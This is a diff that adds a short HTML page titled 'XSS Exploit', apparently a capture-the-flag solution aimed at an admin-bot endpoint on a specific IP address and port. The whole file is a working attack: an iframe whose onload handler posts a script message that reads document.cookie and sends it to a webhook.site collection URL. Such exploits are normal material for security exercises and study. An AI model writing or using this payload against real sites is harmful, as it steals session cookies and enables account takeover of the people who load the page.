@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Exploit</title>
+</head>
+<body>
+    <h1>Hacked 😈</h1>
+    <iframe 
+        src="http://103.130.211.150:19065/admin-bot" 
+        width="800" 
+        height="600" 
+        onload="this.contentWindow.postMessage('<script>fetch(`https://webhook.site/66c71ff9-541c-4feb-90e9-e0b7292a9f79?cookie=${document.cookie}`)</script>', '*')">
+    </iframe>
+</body>
+</html>
